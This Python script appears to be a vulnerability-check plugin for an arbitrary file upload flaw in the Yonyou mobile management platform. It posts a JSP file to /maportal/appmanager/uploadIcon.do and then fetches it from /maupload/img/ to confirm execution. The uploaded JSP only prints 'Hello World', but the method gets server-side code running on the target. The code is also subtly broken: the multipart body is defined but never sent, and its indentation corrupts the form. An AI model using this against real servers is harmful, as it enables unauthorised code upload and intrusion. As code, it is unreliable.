import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友移动管理平台uploadIcon任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"macOS"',
        'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'no-cors',
        'Sec-Fetch-Dest': 'image',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryh1ZETbVA73oQbnyE',
    }
    data = '''------WebKitFormBoundaryh1ZETbVA73oQbnyE
    Content-Disposition: form-data; name="iconFile";filename="123869.jsp"

    <%
    out.println("Hello World");
    %>
    ------WebKitFormBoundaryh1ZETbVA73oQbnyE--'''
    vurl = urllib.parse.urljoin(url, "/maportal/appmanager/uploadIcon.do")
    try:
        response = requests.post(vurl, headers=headers)
        if response.status_code == 200:
            response = requests.get(url+'/maupload/img/123869.jsp', headers=headers)
            if response.status_code == 200 and 'World' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult